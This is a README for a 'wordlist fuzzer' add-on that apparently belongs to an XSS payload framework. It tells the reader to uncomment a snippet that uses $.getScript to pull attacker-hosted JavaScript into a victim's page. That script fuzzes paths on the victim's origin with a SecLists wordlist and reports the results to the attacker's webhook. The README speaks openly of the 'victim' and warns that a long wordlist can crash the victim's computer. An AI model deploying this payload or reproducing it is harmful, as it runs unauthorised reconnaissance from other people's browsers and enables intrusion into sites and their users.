# Wordlist fuzzer
Fuzz for a URL using a attacker specified wordlist (from a URL)

# Usage
Uncomment from line number 184 to 186 in `index.js`. The line contains the following code:-
```javascript
$.getScript("https://raw.githubusercontent.com/shriyanss/payload-pro/main/addons/wordlist_fuzzer/wordlist_fuzzer.js", function () {
    fuzz_path("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt", (document.location.origin));
});
```

# Functioning
The function `fuzz_path()` is responsible for fuzzing paths. It takes two arguments, first is the worlist URL, and second is target location
**A note of caution: Use only small wordlist. A long wordlist can crash the computer of victim, thus you may lose some information**

# Customising
If you already have some information about where the payload will be fired, you can enter a URL to fuzz on

# Webhook
This requires same webhook as defined in main payload file.
